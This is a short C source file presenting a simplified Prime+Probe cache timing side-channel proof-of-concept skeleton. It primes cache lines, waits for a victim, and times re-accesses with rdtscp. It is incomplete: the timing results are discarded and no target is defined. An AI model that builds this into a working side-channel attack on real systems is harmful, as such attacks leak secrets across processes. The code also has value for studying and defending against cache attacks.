#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>

#define CACHE_SIZE (8 * 1024 * 1024)
#define WAYS 16
#define SETS 8192

// Simplified Prime+Probe PoC structure
int main() {
    char *eviction_set = malloc(CACHE_SIZE);
    
    while (1) {
        // Prime: fill the cache sets
        for (int i = 0; i < CACHE_SIZE; i += 4096) {
            eviction_set[i] = 1;
        }
        
        // Wait for victim execution
        for (volatile int z = 0; z < 1000; z++) {}
        
        // Probe: measure access time to eviction set
        for (int i = 0; i < CACHE_SIZE; i += 4096) {
            unsigned int junk;
            uint64_t t1 = __rdtscp(&junk);
            volatile char x = eviction_set[i];
            uint64_t t2 = __rdtscp(&junk);
            // High latency = victim evicted this set
        }
    }
    free(eviction_set);
    return 0;
}
